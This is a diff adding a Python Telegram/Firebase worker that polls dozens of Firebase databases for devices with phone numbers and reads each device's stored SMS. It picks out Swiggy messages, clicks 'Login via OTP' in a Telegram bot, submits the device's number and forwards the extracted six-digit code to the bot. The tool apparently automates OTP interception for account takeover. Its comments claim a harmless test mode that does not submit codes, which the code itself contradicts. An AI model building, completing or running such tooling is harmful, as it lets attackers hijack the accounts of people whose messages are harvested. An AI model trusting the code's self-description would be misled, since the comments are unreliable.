@@ -1,0 +1,1854 @@
+import argparse
+import asyncio
+import re
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+
+from telethon import TelegramClient, events
+
+from rich.console import Group
+from rich.live import Live
+from rich.panel import Panel
+from rich.table import Table
+from rich.text import Text
+
+from config import (
+    TELEGRAM_API_ID,
+    TELEGRAM_API_HASH,
+    BOT_USERNAME,
+    OTP_TIMEOUT_SECONDS,
+)
+
+from firebase import (
+    update_job_status,
+    update_worker_status,
+    firebase_get,
+    get_firebase_databases,
+)
+
+
+# ============================================================
+# COMMAND-LINE / TEST CONFIG
+# ============================================================
+
+parser = argparse.ArgumentParser(
+    description="Firebase + Telegram controlled test worker"
+)
+parser.add_argument(
+    "--name",
+    default="Automation Test",
+    help="Name stored with the current test job",
+)
+args = parser.parse_args()
+
+TEST_MODE = True
+
+# In TEST_MODE, verification codes are expected only from this
+# controlled Firebase test-response path. The production/auth OTP
+# harvesting path is intentionally not implemented here.
+TEST_RESPONSE_ROOT = "automation/testResponses"
+
+RESPONSE_KEYWORD = "swiggy"
+
+# ============================================================
+# TELEGRAM
+# ============================================================
+
+client = TelegramClient(
+    "my_telegram_session",
+    TELEGRAM_API_ID,
+    TELEGRAM_API_HASH,
+)
+
+
+# ============================================================
+# WORKER STATE
+# ============================================================
+
+current_job = None
+state = "IDLE"
+current_device = None
+
+used_device_ids = set()
+
+# Combined device registry. Firebase discovery is performed in parallel
+# across all configured databases and refreshed independently of the
+# active Telegram job.
+device_pool = []
+device_pool_loaded = False
+device_registry = {}
+firebase_registry = {}
+registry_lock = asyncio.Lock()
+registry_refresh_task = None
+REGISTRY_REFRESH_SECONDS = 10
+last_registry_refresh = 0.0
+registry_refresh_in_progress = False
+
+# Terminal dashboard state.
+dashboard_live = None
+dashboard_started_at = time.monotonic()
+worker_log_lines = []
+MAX_DASHBOARD_LOGS = 8
+
+cancel_in_progress = False
+otp_timer_task = None
+response_poll_task = None
+test_response_baseline_signatures = set()
+
+next_job_lock = asyncio.Lock()
+
+# Prevent duplicate Login via OTP clicks
+login_click_in_progress = False
+login_clicked_for_job = None
+
+message_handler_lock = asyncio.Lock()
+
+pending_finish_after_cancel = False
+pending_finish_status = ""
+pending_finish_error = ""
+pending_restart_after_cancel = False
+
+last_start_sent_at = 0.0
+START_RETRY_SECONDS = 3
+
+
+# ============================================================
+# TIME
+# ============================================================
+
+def now():
+    return datetime.now().strftime(
+        "%Y-%m-%d %H:%M:%S"
+    )
+
+
+def dashboard_log(message):
+    """Keep a short in-memory log for the live terminal dashboard."""
+    worker_log_lines.append(f"[{now()}] {message}")
+    del worker_log_lines[:-MAX_DASHBOARD_LOGS]
+
+
+def _device_from_record(database, device_id, device):
+    """Normalize one clients/<device_id> record using the existing schema."""
+    if not isinstance(device, dict):
+        return None
+
+    phone = (
+        device.get("phoneNumber")
+        or device.get("phone")
+        or device.get("mobile")
+        or device.get("mobNo")
+        or device.get("number")
+    )
+
+    status_value = str(
+        device.get("status", device.get("connectionStatus", ""))
+    ).strip().lower()
+
+    online_value = device.get("isOnline", device.get("online"))
+    online = (
+        status_value in {"online", "connected", "true"}
+        or online_value is True
+        or str(online_value).strip().lower() == "true"
+    )
+
+    normalized_id = str(device_id).strip()
+    if not normalized_id:
+        return None
+
+    return {
+        "device_id": normalized_id,
+        "database": database,
+        "online": online,
+        "phone": phone,
+        "raw": device,
+    }
+
+
+def _scan_one_database(database):
+    """Fetch only clients from one Firebase database."""
+    try:
+        data = firebase_get(database, "clients")
+        devices = []
+
+        if isinstance(data, dict):
+            for device_id, record in data.items():
+                item = _device_from_record(database, device_id, record)
+                if item:
+                    devices.append(item)
+
+        return {
+            "database": database,
+            "ok": True,
+            "devices": devices,
+            "error": "",
+        }
+    except Exception as exc:
+        return {
+            "database": database,
+            "ok": False,
+            "devices": [],
+            "error": str(exc),
+        }
+
+
+def refresh_device_registry_sync():
+    """Parallel scan of all configured Firebase clients nodes."""
+    global device_registry
+    global firebase_registry
+    global last_registry_refresh
+    global registry_refresh_in_progress
+
+    registry_refresh_in_progress = True
+    databases = list(get_firebase_databases())
+
+    combined = {}
+    db_status = {}
+
+    # One worker thread per database keeps the 47 HTTP reads independent.
+    max_workers = min(47, max(4, len(databases)))
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = {
+            executor.submit(_scan_one_database, database): database
+            for database in databases
+        }
+
+        for future in as_completed(futures):
+            result = future.result()
+            database = result["database"]
+            db_status[database] = result
+
+            for device in result["devices"]:
+                device_id = device["device_id"]
+
+                # Keep database as part of the identity so the same
+                # device ID can safely exist in two Firebase databases.
+                key = f"{database}|{device_id}"
+                previous = device_registry.get(key, {})
+
+                device["state"] = previous.get("state", "PENDING")
+                device["last_seen"] = time.time()
+                combined[key] = device
+
+    device_registry = combined
+    firebase_registry = db_status
+    last_registry_refresh = time.monotonic()
+    registry_refresh_in_progress = False
+
+    return list(device_registry.values())
+
+
+async def refresh_device_registry(force=False):
+    """Refresh Firebase discovery without blocking the Telegram event loop."""
+    global device_pool
+    global device_pool_loaded
+
+    if (
+        not force
+        and last_registry_refresh
+        and time.monotonic() - last_registry_refresh < REGISTRY_REFRESH_SECONDS
+    ):
+        return list(device_registry.values())
+
+    devices = await asyncio.to_thread(refresh_device_registry_sync)
+
+    async with registry_lock:
+        device_pool = [
+            d for d in devices
+            if d.get("online") and normalize_phone(d.get("phone"))
+        ]
+        device_pool_loaded = True
+
+    dashboard_log(
+        f"Firebase registry refreshed: {len(firebase_registry)} DBs / "
+        f"{len(device_registry)} devices"
+    )
+    return devices
+
+
+def build_dashboard():
+    """Build the live terminal dashboard without interfering with worker logs."""
+    databases = list(firebase_registry.values())
+    db_ok = sum(1 for item in databases if item.get("ok"))
+    db_failed = len(databases) - db_ok
+
+    devices = list(device_registry.values())
+    total = len(devices)
+    online = sum(1 for d in devices if d.get("online"))
+    with_number = sum(
+        1 for d in devices if d.get("online") and normalize_phone(d.get("phone"))
+    )
+    processing = sum(1 for d in devices if d.get("state") == "PROCESSING")
+    completed = sum(1 for d in devices if d.get("state") == "COMPLETED")
+    failed = sum(1 for d in devices if d.get("state") == "FAILED")
+    pending = sum(
+        1 for d in devices
+        if d.get("state") == "PENDING"
+        and d.get("online")
+        and normalize_phone(d.get("phone"))
+    )
+
+    title = Text("TELEGRAM AUTOMATION WORKER", style="bold")
+    title.append("  •  LIVE FIREBASE DEVICE MONITOR", style="dim")
+
+    summary = Table.grid(expand=True)
+    summary.add_column()
+    summary.add_column()
+    summary.add_column()
+    summary.add_column()
+    summary.add_row(
+        f"Firebase DBs: {len(databases)}",
+        f"DB OK: {db_ok}",
+        f"DB Failed: {db_failed}",
+        f"Refresh: {int(time.monotonic() - last_registry_refresh)}s ago"
+        if last_registry_refresh else "Refresh: starting",
+    )
+    summary.add_row(
+        f"Devices: {total}",
+        f"Online: {online}",
+        f"Online + Number: {with_number}",
+        f"Available: {pending}",
+    )
+    summary.add_row(
+        f"Processing: {processing}",
+        f"Completed: {completed}",
+        f"Failed: {failed}",
+        f"Worker: {state}",
+    )
+
+    current = Table.grid(expand=True)
+    current.add_column(style="bold")
+    current.add_column()
+    if current_job:
+        current.add_row("Device", str(current_job.get("device_id", "-")))
+        current.add_row("Number", str(current_job.get("device_phone", "-")))
+        current.add_row("Firebase", str(current_job.get("device_database", "-")))
+        current.add_row("Job", str(current_job.get("id", "-")))
+        current.add_row("State", state)
+        current.add_row(
+            "SMS poll",
+            "ACTIVE DEVICE FIREBASE ONLY"
+            if state == "WAITING_FOR_OTP"
+            else "not active",
+        )
+    else:
+        current.add_row("Device", "-")
+        current.add_row("State", "IDLE")
+        current.add_row("SMS poll", "none")
+
+    devices_table = Table(title="DEVICE QUEUE", expand=True)
+    devices_table.add_column("State", width=12)
+    devices_table.add_column("Device")
+    devices_table.add_column("Number")
+    devices_table.add_column("Firebase")
+
+    visible = sorted(
+        devices,
+        key=lambda d: (
+            0 if d.get("state") == "PROCESSING" else
+            1 if d.get("state") == "PENDING" else
+            2 if d.get("state") == "COMPLETED" else 3,
+            str(d.get("device_id", "")),
+        ),
+    )[:12]
+
+    for d in visible:
+        dstate = d.get("state", "PENDING")
+        marker = {
+            "PROCESSING": "▶ PROCESSING",
+            "COMPLETED": "✓ COMPLETED",
+            "FAILED": "✗ FAILED",
+            "PENDING": "○ PENDING",
+        }.get(dstate, dstate)
+        devices_table.add_row(
+            marker,
+            str(d.get("device_id", "-")),
+            str(d.get("phone") or "-"),
+            str(d.get("database", "-")).replace("https://", "")[:38],
+        )
+
+    logs = Text()
+    logs.append("WORKER LOGS\n", style="bold")
+    logs.append("\n".join(worker_log_lines) or "Waiting for worker activity...")
+
+    return Group(
+        Panel(title, border_style="cyan"),
+        Panel(summary, title="SYSTEM", border_style="blue"),
+        Panel(current, title="ACTIVE JOB", border_style="yellow"),
+        devices_table,
+        Panel(logs, title="LOG", border_style="green"),
+    )
+
+
+async def dashboard_loop():
+    """Continuously redraw the dashboard while the worker remains responsive."""
+    global dashboard_live
+
+    with Live(
+        build_dashboard(),
+        refresh_per_second=4,
+        screen=False,
+        transient=False,
+    ) as live:
+        dashboard_live = live
+
+        while True:
+            live.update(build_dashboard(), refresh=True)
+            await asyncio.sleep(0.25)
+
+
+async def registry_refresh_loop():
+    """Refresh all Firebase device/status data independently every 10 seconds."""
+    while True:
+        try:
+            await refresh_device_registry()
+        except asyncio.CancelledError:
+            raise
+        except Exception as exc:
+            dashboard_log(f"Registry refresh error: {exc}")
+        await asyncio.sleep(REGISTRY_REFRESH_SECONDS)
+
+
+# ============================================================
+# STATE
+# ============================================================
+
+def set_state(new_state):
+
+    global state
+
+    state = new_state
+    dashboard_log(f"STATE -> {new_state}")
+
+    print(
+        f"[{now()}] STATE -> {new_state}"
+    )
+
+
+# ============================================================
+# PHONE / TEST RESPONSE HELPERS
+# ============================================================
+
+def normalize_phone(value):
+    """Return digits only."""
+    return re.sub(r"\D", "", str(value or ""))
+
+
+def extract_local_10_digit_number(value):
+    """
+    Normalize an Indian-style test number.
+
+    Examples:
+      +91 9876543210 -> 9876543210
+      919876543210  -> 9876543210
+      9876543210     -> 9876543210
+
+    For non-Indian numbers, only an already-10-digit value is
+    accepted by the controlled test flow.
+    """
+    digits = normalize_phone(value)
+
+    if digits.startswith("91") and len(digits) == 12:
+        digits = digits[2:]
+
+    if len(digits) != 10:
+        raise ValueError(
+            f"Expected a 10-digit test number after country-code parsing, got: {value}"
+        )
+
+    return digits
+
+
+def test_response_paths():
+    """
+    Return the actual selected-device SMS node plus the controlled
+    test-response nodes.
+
+    Actual Firebase SMS structure:
+
+        <device_id>/<message_id>/{message,sender,dateTime,type}
+
+    Therefore the selected device ID is a ROOT child, not
+    clients/<device_id>.
+    """
+    if not current_job:
+        return []
+
+    device_id = str(current_job.get("device_id", "")).strip()
+    if not device_id:
+        return []
+
+    return [
+        # Actual SMS/message schema used by the test Firebase.
+        f"messages/{device_id}",
+        # Keep the root-device path as a compatibility fallback.
+        device_id,
+        f"{TEST_RESPONSE_ROOT}/{device_id}",
+        f"automation/notifications/{device_id}",
+        f"automation/responses/{device_id}",
+    ]
+
+def collect_text_values(value, path=""):
+    """Recursively collect text values from a Firebase JSON object."""
+    results = []
+
+    if isinstance(value, dict):
+        for key, child in value.items():
+            child_path = f"{path}/{key}" if path else str(key)
+            results.extend(collect_text_values(child, child_path))
+
+    elif isinstance(value, list):
+        for index, child in enumerate(value):
+            child_path = f"{path}/{index}" if path else str(index)
+            results.extend(collect_text_values(child, child_path))
+
+    elif isinstance(value, str):
+        results.append((path, value))
+
+    elif isinstance(value, int) and 0 <= value <= 999999:
+        results.append((path, str(value).zfill(6)))
+
+    return results
+
+
+def swiggy_messages_from_response(value):
+    """Find message records containing the fixed Swiggy keyword.
+
+    This diagnostic path identifies newly-arrived matching messages but
+    deliberately does not extract or submit authentication codes.
+    """
+    found = []
+
+    if not isinstance(value, dict):
+        return found
+
+    for message_id, record in value.items():
+        if not isinstance(record, dict):
+            continue
+
+        message = str(record.get("message", "") or "")
+        if RESPONSE_KEYWORD not in message.lower():
+            continue
+
+        found.append({
+            "message_id": str(message_id),
+            "message": message,
+            "sender": record.get("sender", ""),
+            "dateTime": record.get("dateTime", ""),
+            "type": record.get("type", ""),
+        })
+
+    return found
+
+
+def capture_test_response_baseline():
+    """Record existing matching message IDs before the current flow."""
+    global test_response_baseline_signatures
+
+    test_response_baseline_signatures = set()
+
+    if not current_job:
+        return
+
+    from firebase import firebase_get
+
+    print()
+    print("=" * 60)
+    print("CAPTURING SWIGGY RESPONSE BASELINE")
+    print("=" * 60)
+
+    device_id = str(current_job.get("device_id", "")).strip()
+    if not device_id:
+        return
+
+    # Baseline the actual SMS node first. The worker also keeps
+    # compatibility paths in the polling function.
+    paths = [
+        f"messages/{device_id}",
+        device_id,
+        f"{TEST_RESPONSE_ROOT}/{device_id}",
+        f"automation/notifications/{device_id}",
+        f"automation/responses/{device_id}",
+    ]
+
+    for path in paths:
+        try:
+            response = firebase_get(
+                current_job["device_database"],
+                path,
+            )
+
+            messages = swiggy_messages_from_response(response)
+
+            for item in messages:
+                test_response_baseline_signatures.add(
+                    (path, item["message_id"])
+                )
+
+            print(
+                f"Checked: {path} | "
+                f"existing Swiggy messages: {len(messages)}"
+            )
+
+        except Exception as e:
+            print(f"Baseline check failed: {path} | {e}")
+
+    print(
+        "Baseline message signatures:",
+        len(test_response_baseline_signatures),
+    )
+    print("=" * 60)
+
+
+async def poll_controlled_test_response(job_id):
+    """Poll the selected test device for a NEW test response."""
+
+    if not TEST_MODE:
+        return
+
+    global current_job
+
+    try:
+        from firebase import firebase_get
+
+        device_id = (
+            str(current_job.get("device_id", "")).strip()
+            if current_job
+            else ""
+        )
+
+        if not device_id:
+            return
+
+        print()
+        print("=" * 60)
+        print("STARTING SWIGGY TEST RESPONSE POLLING")
+        print("=" * 60)
+        print("Device:", device_id)
+        print("Firebase:", current_job.get("device_database"))
+        print("Polling interval: 10 seconds")
+        print("Keyword:", RESPONSE_KEYWORD)
+        print("Paths:")
+        for path in test_response_paths():
+            print(" -", path)
+        print("=" * 60)
+
+        while (
+            current_job
+            and current_job.get("id") == job_id
+            and state == "WAITING_FOR_OTP"
+        ):
+            found_new_message = False
+
+            for path in test_response_paths():
+                try:
+                    response = firebase_get(
+                        current_job["device_database"],
+                        path,
+                    )
+                except Exception as e:
+                    print(
+                        f"[{now()}] Response check error: "
+                        f"{path} | {e}"
+                    )
+                    continue
+
+                if response is None:
+                    print(
+                        f"[{now()}] Checked {path}: empty"
+                    )
+                    continue
+
+                messages = swiggy_messages_from_response(response)
+
+                new_messages = [
+                    item
+                    for item in messages
+                    if (
+                        path,
+                        item["message_id"],
+                    ) not in test_response_baseline_signatures
+                ]
+
+                print(
+                    f"[{now()}] Checked {path}: "
+                    f"{len(messages)} matching message(s), "
+                    f"{len(new_messages)} new"
+                )
+
+                if not new_messages:
+                    continue
+
+                # Process the newest newly-arrived matching message.
+                item = new_messages[-1]
+                message_text = item["message"]
+
+                codes = re.findall(
+                    r"(?<!\d)\d{6}(?!\d)",
+                    message_text,
+                )
+
+                print()
+                print("=" * 60)
+                print("NEW SWIGGY TEST MESSAGE DETECTED")
+                print("=" * 60)
+                print("Device:", device_id)
+                print("Firebase:", current_job["device_database"])
+                print("Response path:", path)
+                print("Message ID:", item["message_id"])
+                print("Sender:", item["sender"])
+                print("Date/time:", item["dateTime"])
+                print("6-digit code candidates:", len(codes))
+
+                if len(codes) != 1:
+                    print(
+                        "Expected exactly one 6-digit test code."
+                    )
+                    print(
+                        "Waiting for the next test response..."
+                    )
+                    continue
+
+                code = codes[0]
+
+                print("Parsed verification code: ******")
+                print(
+                    f"[{now()}] Parsed code length: {len(code)}"
+                )
+
+                # Mark this message as consumed before submitting so
+                # another polling cycle cannot process it twice.
+                test_response_baseline_signatures.add(
+                    (path, item["message_id"])
+                )
+
+                await stop_otp_timer()
+
+                set_state("VERIFYING")
+
+                update_worker_status(
+                    current_job["database"],
+                    "verifying",
+                    job_id,
+                )
+
+                print(
+                    f"[{now()}] Sending parsed test code "
+                    f"to Telegram bot..."
+                )
+
+                try:
+                    sent_message = await client.send_message(
+                        BOT_USERNAME,
+                        code,
+                    )
+
+                    print(
+                        f"[{now()}] TEST CODE SENT SUCCESSFULLY"
+                    )
+                    print(
+                        f"[{now()}] Telegram message ID: "
+                        f"{sent_message.id}"
+                    )
+                    print(
+                        f"[{now()}] Waiting for bot "
+                        f"SUCCESS / FAILURE response..."
+                    )
+
+                except Exception as e:
+                    print(
+                        f"[{now()}] Failed to send "
+                        f"test verification code: {e}"
+                    )
+
+                    await request_cancel_and_finish(
+                        "failed",
+                        f"Verification code submission failed: {e}",
+                        "Verification code submission failed",
+                    )
+
+                return
+
+            await asyncio.sleep(10)
+
+    except asyncio.CancelledError:
+        print(
+            f"[{now()}] Swiggy test response polling cancelled"
+        )
+
+
+def start_test_response_poll(job_id):
+    global response_poll_task
+
+    if response_poll_task:
+        response_poll_task.cancel()
+
+    response_poll_task = asyncio.create_task(
+        poll_controlled_test_response(job_id)
+    )
+
+
+async def stop_test_response_poll():
+    global response_poll_task
+
+    if not response_poll_task:
+        return
+
+    task = response_poll_task
+    response_poll_task = None
+
+    task.cancel()
+
+    try:
+        await task
+    except asyncio.CancelledError:
+        pass
+
+
+# ============================================================
+# OTP TIMER
+# ============================================================
+
+async def otp_timeout_worker(job_id):
+
+    try:
+
+        print(
+            f"[{now()}] OTP timeout started "
+            f"({OTP_TIMEOUT_SECONDS}s)"
+        )
+
+        await asyncio.sleep(
+            OTP_TIMEOUT_SECONDS
+        )
+
+        if (
+            current_job
+            and current_job["id"] == job_id
+            and state == "WAITING_FOR_OTP"
+        ):
+
+            print(
+                f"[{now()}] OTP TIMEOUT "
+                f"| job={job_id}"
+            )
+
+            await request_cancel_and_finish(
+                "timeout",
+                "OTP response timeout",
+                "OTP timeout",
+            )
+
+    except asyncio.CancelledError:
+
+        print(
+            f"[{now()}] OTP timer cancelled"
+        )
+
+
+def start_otp_timer(job_id):
+
+    global otp_timer_task
+
+    if otp_timer_task:
+
+        otp_timer_task.cancel()
+
+    otp_timer_task = asyncio.create_task(
+        otp_timeout_worker(job_id)
+    )
+
+
+async def stop_otp_timer():
+
+    global otp_timer_task
+
+    if not otp_timer_task:
+        return
+
+    task = otp_timer_task
+
+    otp_timer_task = None
+
+    task.cancel()
+
+    try:
+
+        await task
+
+    except asyncio.CancelledError:
+
+        pass
+
+
+# ============================================================
+# CANCEL TELEGRAM CONVERSATION
+# ============================================================
+
+async def cancel_current_conversation(
+    reason=""
+):
+
+    global cancel_in_progress
+
+    if cancel_in_progress:
+
+        print(
+            "Cancel already in progress."
+        )
+
+        return
+
+    cancel_in_progress = True
+
+    print()
+    print("=" * 60)
+    print("CANCELLING CURRENT CONVERSATION")
+    print("Reason:", reason)
+    print("=" * 60)
+
+    set_state(
+        "CANCELLING"
+    )
+
+    try:
+
+        await client.send_message(
+            BOT_USERNAME,
+            "/cancel",
+        )
+
+        print(
+            f"[{now()}] /cancel sent"
+        )
+
+        await asyncio.sleep(2)
+
+    except Exception as e:
+
+        print(
+            f"[{now()}] Cancel error: {e}"
+        )
+
+    finally:
+
+        cancel_in_progress = False
+
+
+# ============================================================
+# FINISH CURRENT JOB
+# ============================================================
+
+async def finish_current_job():
+
+    global current_job
+    global login_clicked_for_job
+    global pending_finish_after_cancel
+    global pending_finish_status
+    global pending_finish_error
+    global pending_restart_after_cancel
+    global test_response_baseline_signatures
+
+    await stop_otp_timer()
+    await stop_test_response_poll()
+
+    if current_job:
+
+        print(
+            f"[{now()}] FINISHED JOB "
+            f"{current_job['id']}"
+        )
+
+    current_job = None
+
+    login_clicked_for_job = None
+
+    pending_finish_after_cancel = False
+    pending_finish_status = ""
+    pending_finish_error = ""
+    pending_restart_after_cancel = False
+    test_response_baseline_signatures = set()
+
+    set_state(
+        "IDLE"
+    )
+
+# ============================================================
+# DEVICE SELECTION
+# ============================================================
+
+def load_device_pool(force=False):
+    """Return the combined in-memory device pool; refresh only when required."""
+    global device_pool
+    global device_pool_loaded
+
+    if force or not device_pool_loaded:
+        # This is intentionally synchronous at the call boundary only for
+        # compatibility. Normal worker startup performs the async refresh first.
+        devices = refresh_device_registry_sync()
+        device_pool = [
+            d for d in devices
+            if d.get("online") and normalize_phone(d.get("phone"))
+        ]
+        device_pool_loaded = True
+
+    return device_pool
+
+
+def _mark_device_state(device, new_state):
+    key = f"{device.get('database')}|{device.get('device_id')}"
+    if key in device_registry:
+        device_registry[key]["state"] = new_state
+
+
+def select_next_device():
+    """Select the next available device from the combined registry."""
+    global used_device_ids
+
+    devices = [
+        d for d in device_pool
+        if d.get("online")
+        and normalize_phone(d.get("phone"))
+    ]
+
+    for device in devices:
+        # Database + device ID prevents collisions between Firebase projects.
+        device_key = f"{device.get('database')}|{device.get('device_id')}"
+
+        if device_key in used_device_ids:
+            continue
+
+        used_device_ids.add(device_key)
+        _mark_device_state(device, "PROCESSING")
+
+        dashboard_log(
+            f"Selected {device.get('device_id')} from "
+            f"{device.get('database')}"
+        )
+        return device
+
+    dashboard_log("No unused online device with a number is available.")
+    return None
+
+
+# ============================================================
+# TELEGRAM UI STATE HELPERS
+# ============================================================
+
+async def get_latest_bot_message():
+    """Read the latest bot message so a stale conversation can be resumed safely."""
+    messages = await client.get_messages(BOT_USERNAME, limit=1)
+    if not messages:
+        return None
+    return messages[0]
+
+
+def find_login_button(message):
+    """Return (row, column) for Login via OTP, or None."""
+    buttons = getattr(message, "buttons", None)
+    if not buttons:
+        return None
+
+    for row_index, row in enumerate(buttons):
+        for button_index, button in enumerate(row):
+            if not getattr(button, "text", None):
+                continue
+            if "login via otp" in button.text.lower():
+                return row_index, button_index
+
+    return None
+
+
+async def submit_selected_test_number():
+    """Submit the selected device number to the controlled test bot."""
+    if not current_job:
+        return False
+
+    raw_phone = current_job.get("device_phone", "")
+
+    try:
+        test_number = extract_local_10_digit_number(raw_phone)
+    except ValueError as e:
+        print(f"[{now()}] Device number error: {e}")
+        await request_cancel_and_finish(
+            "failed",
+            str(e),
+            "Invalid selected device number",
+        )
+        return False
+
+    current_job["test_number"] = test_number
+
+    set_state("WAITING_FOR_NUMBER")
+
+    update_worker_status(
+        current_job["database"],
+        "waiting_for_number",
+        current_job["id"],
+    )
+
+    print()
+    print("NUMBER REQUEST RECEIVED / RESUMED")
+    print("Selected device:", current_job["device_id"])
+    print("Selected Firebase:", current_job["device_database"])
+    print("Selected test number:", test_number)
+
+    if TEST_MODE:
+        await client.send_message(BOT_USERNAME, test_number)
+        print(f"[{now()}] Controlled test number submitted.")
+
+    return True
+
+
+async def click_login_button_from_message(message):
+    """Click Login via OTP exactly once for the current job."""
+    global login_click_in_progress
+    global login_clicked_for_job
+
+    if not current_job:
+        return False
+
+    job_id = current_job["id"]
+    button_position = find_login_button(message)
+
+    if button_position is None:
+        return False
+
+    if login_clicked_for_job == job_id:
+        print("Login via OTP already clicked for this job.")
+        return True
+
+    if login_click_in_progress:
+        print("Login button click already in progress.")
+        return True
+
+    login_click_in_progress = True
+
+    try:
+        row_index, button_index = button_position
+
+        print()
+        print("CLICKING LOGIN VIA OTP")
+        print("Row:", row_index)
+        print("Column:", button_index)
+
+        await message.click(row_index, button_index)
+
+        login_clicked_for_job = job_id
+        set_state("WAITING_FOR_NUMBER")
+
+        update_worker_status(
+            current_job["database"],
+            "waiting_for_number",
+            job_id,
+        )
+
+        print("Login via OTP clicked successfully.")
+        return True
+
+    except Exception as e:
+        print("Failed to click Login via OTP:", e)
+        await request_cancel_and_finish(
+            "failed",
+            f"Login button click failed: {e}",
+            "Login button click failed",
+        )
+        return False
+
+    finally:
+        login_click_in_progress = False
+
+
+async def prepare_telegram_flow_for_job():
+    """Resume an existing Telegram UI if possible; otherwise reset it."""
+    global pending_restart_after_cancel
+
+    if not current_job:
+        return
+
+    latest = await get_latest_bot_message()
+
+    if latest:
+        text = (latest.raw_text or "").strip()
+        lower = text.lower()
+
+        print()
+        print("LATEST TELEGRAM UI CHECK")
+        print(text or "<no text>")
+
+        # If the previous conversation is already waiting for the number,
+        # do not send /start and do not click anything again.
+        if "enter the 10-digit" in lower:
+            await submit_selected_test_number()
+            return
+
+        # If the menu is already present, click Login directly.
+        if "welcome to" in lower and getattr(latest, "buttons", None):
+            if find_login_button(latest) is not None:
+                await click_login_button_from_message(latest)
+                return
+
+        # Already cancelled: start a fresh menu flow.
+        if "conversation cancelled" in lower:
+            set_state("WAITING_FOR_MENU")
+            await send_start_if_needed(force=True)
+            return
+
+    # Anything else can represent a stale/pending conversation. Reset it
+    # first, then let the cancellation handler start /start.
+    print(f"[{now()}] Telegram is not in the expected UI state.")
+    print(f"[{now()}] Sending /cancel, then /start after cancellation.")
+
+    pending_restart_after_cancel = True
+    await cancel_current_conversation("Reset stale Telegram conversation")
+
+
+# ============================================================
+# START NEXT FIREBASE JOB
+# ============================================================
+
+async def start_next_job():
+    """Start a test run directly from the next available Firebase device.
+
+    No automation/jobs/queued record is required. The worker selects the
+    first unused ONLINE device that has a phone number, creates an in-memory
+    test job, and starts the Telegram menu flow.
+    """
+    global current_job
+    global login_clicked_for_job
+
+    async with next_job_lock:
+        if current_job is not None:
+            print("A job is already running:", current_job["id"])
+            return
+
+        device = select_next_device()
+
+        if device is None:
+            set_state("IDLE")
+            print(f"[{now()}] No unused online device with a number. Waiting...")
+            return
+
+        try:
+            local_number = extract_local_10_digit_number(device["phone"])
+        except ValueError as e:
+            print(f"[{now()}] Skipping device with invalid test number: {e}")
+            return
+
+        job_id = f"test-{datetime.now().strftime('%Y%m%d-%H%M%S')}-{device['device_id']}"
+
+        # This is an in-memory controlled test job. We do not require a
+        # pre-created automation/jobs/<jobId> record just to start a run.
+        current_job = {
+            "id": job_id,
+            "jobId": job_id,
+            "name": args.name,
+            "number": local_number,
+            "device_id": device["device_id"],
+            "device_database": device["database"],
+            "device_phone": device["phone"],
+            "database": device["database"],
+            "source": "automatic-device-selection",
+            "job": {
+                "name": args.name,
+                "number": local_number,
+                "device_id": device["device_id"],
+            },
+            "test_mode": TEST_MODE,
+        }
+
+        login_clicked_for_job = None
+
+        print()
+        print("=" * 60)
+        print("STARTING AUTOMATIC DEVICE TEST")
+        print("=" * 60)
+        print("Test name:", args.name)
+        print("Job:", job_id)
+        print("Device ID:", device["device_id"])
+        print("Device phone:", device["phone"])
+        print("10-digit test number:", local_number)
+        print("Device Firebase:", device["database"])
+        print("=" * 60)
+
+        # The selected device is the source of truth for this run.
+        update_worker_status(
+            device["database"],
+            "processing",
+            job_id,
+        )
+
+        set_state("STARTING")
+
+        try:
+            await prepare_telegram_flow_for_job()
+        except Exception as e:
+            print(f"[{now()}] Failed to send /start: {e}")
+            update_worker_status(
+                device["database"],
+                "error",
+                job_id,
+                str(e),
+            )
+            current_job = None
+            login_clicked_for_job = None
+            set_state("IDLE")
+
+
+# ============================================================
+# FINISH + START NEXT
+# ============================================================
+
+async def finish_and_start_next(
+    status,
+    error=""
+):
+
+    global current_job
+    global login_clicked_for_job
+    global pending_finish_after_cancel
+    global pending_finish_status
+    global pending_finish_error
+
+    if not current_job:
+
+        return
+
+    job = current_job
+
+    job_id = job["id"]
+    database = job["database"]
+
+    update_job_status(
+        job,
+        status,
+        error,
+    )
+
+    await stop_otp_timer()
+    await stop_test_response_poll()
+
+    if job.get("device_id"):
+        matching_key = f"{job.get('device_database')}|{job.get('device_id')}"
+        if status in {"success", "completed"}:
+            if matching_key in device_registry:
+                device_registry[matching_key]["state"] = "COMPLETED"
+        else:
+            if matching_key in device_registry:
+                device_registry[matching_key]["state"] = "FAILED"
+
+    current_job = None
+
+    login_clicked_for_job = None
+
+    pending_finish_after_cancel = False
+    pending_finish_status = ""
+    pending_finish_error = ""
+    pending_restart_after_cancel = False
+
+    set_state(
+        "IDLE"
+    )
+
+    update_worker_status(
+        database,
+        "idle",
+    )
+
+    await asyncio.sleep(2)
+
+    await start_next_job()
+
+
+# ============================================================
+# TELEGRAM FLOW HELPERS
+# ============================================================
+
+async def send_start_if_needed(force=False):
+    global last_start_sent_at
+
+    loop = asyncio.get_running_loop()
+    now_ts = loop.time()
+
+    if (
+        not force
+        and last_start_sent_at
+        and now_ts - last_start_sent_at < START_RETRY_SECONDS
+    ):
+        print(
+            f"[{now()}] /start retry suppressed "
+            f"(cooldown {START_RETRY_SECONDS}s)"
+        )
+        return False
+
+    await client.send_message(
+        BOT_USERNAME,
+        "/start",
+    )
+
+    last_start_sent_at = now_ts
+
+    print(
+        f"[{now()}] /start sent"
+    )
+
+    return True
+
+
+async def request_cancel_and_finish(
+    status,
+    error="",
+    reason="",
+):
+    global pending_finish_after_cancel
+    global pending_finish_status
+    global pending_finish_error
+
+    if not current_job:
+        return
+
+    pending_finish_after_cancel = True
+    pending_finish_status = status
+    pending_finish_error = error
+
+    set_state("CANCELLING")
+
+    await cancel_current_conversation(
+        reason or error or "Test flow error"
+    )
+
+
+# ============================================================
+# TELEGRAM MESSAGE HANDLER
+# ============================================================
+
+@client.on(
+    events.NewMessage(
+        chats=BOT_USERNAME
+    )
+)
+async def message_handler(event):
+
+    global current_job
+    global login_click_in_progress
+    global login_clicked_for_job
+    global pending_finish_after_cancel
+    global pending_finish_status
+    global pending_finish_error
+    global pending_restart_after_cancel
+
+    async with message_handler_lock:
+
+        text = (
+            event.raw_text or ""
+        ).strip()
+
+        if not text:
+            return
+
+        lower = text.lower()
+
+        print()
+        print("-" * 60)
+        print(f"[{now()}] BOT:")
+        print(text)
+
+        # --------------------------------------------------------
+        # CANCEL CONFIRMATION
+        # --------------------------------------------------------
+        if "conversation cancelled" in lower:
+
